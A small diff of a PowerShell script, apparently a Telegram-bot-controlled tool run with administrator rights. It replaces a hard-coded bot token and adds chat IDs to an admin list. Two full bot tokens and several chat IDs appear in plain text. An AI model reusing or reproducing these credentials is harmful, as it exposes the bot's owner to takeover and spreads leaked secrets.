@@ -17,9 +17,9 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 # ===== CONFIG =====
-$BOT_TOKEN = "8397915416:AAGtjvnuM_m46Zp4nEShN5BwsDEoZ_uEuro"
+$BOT_TOKEN = "8908740155:AAH7HEjujAdkLBjs7DrkMnSwiN56J4MfOmc"
 $CHAT_ID = "347753116"
-$ADMIN_CHAT_IDS = @("347753116", "380330092")
+$ADMIN_CHAT_IDS = @("347753116", "7303070402" , "6716357143", "380330092")
 
 $lastUpdate = 0
 $updateMode = $false
